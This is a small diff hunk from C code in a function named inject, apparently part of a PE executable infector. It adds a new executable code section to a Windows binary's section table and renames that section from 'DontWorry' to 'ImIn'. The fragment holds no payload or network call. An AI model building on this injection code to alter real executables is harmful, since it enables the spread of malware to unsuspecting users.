@@ -91,7 +91,7 @@ int			inject(char *name)
   newSectionHeader.VirtualAddress = 3 * 4096;
   newSectionHeader.Misc.VirtualSize = 8;
   newSectionHeader.Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
-  strcpy(newSectionHeader.Name, "DontWorry");
+  strcpy(newSectionHeader.Name, (char *) "ImIn");
   memcpy((PIMAGE_SECTION_HEADER) ((DWORD) pImageSectionHeader + sizeof(IMAGE_SECTION_HEADER)), &newSectionHeader, sizeof(IMAGE_SECTION_HEADER));
 
   // ADD PROPERTIES
